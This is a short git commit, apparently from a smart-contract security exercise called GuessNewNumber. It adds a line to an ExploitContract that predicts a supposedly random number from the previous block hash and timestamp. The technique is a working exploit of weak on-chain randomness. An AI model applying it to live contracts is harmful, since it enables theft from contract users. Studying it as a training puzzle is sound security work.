98925752077fdc85010699e782ff17de9f17fe08
zengzengzenghuy <tayzh2799@gmail.com>
2024-03-25 23:16:59 +0800

    feat: GuessNewNumber

--- GuessNewNumber/src/GuessNewNumber.sol
+++ GuessNewNumber/src/GuessNewNumber.sol
@@ -28,6 +28,7 @@ contract ExploitContract {
     uint8 public answer;
 
     function Exploit() public returns (uint8) {
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
         return answer;
     }
 }
